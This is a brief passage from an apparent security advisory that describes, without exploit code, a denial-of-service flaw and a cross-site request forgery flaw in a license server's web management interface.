      Technical details
      ---------------------------------------------------------------

      The license server web management interface contains two
      vulnerabilities:
      1) Denial-of-Service vulnerability which allows an
         unauthenticated attacker to crash the license server.

      2) Cross Site Request Forgery vulnerability which enables an
         attacker to create additional users in the management
         interface, IF a logged-in administrator can be lured to
         visit a link pointing to the vulnerable functionality.
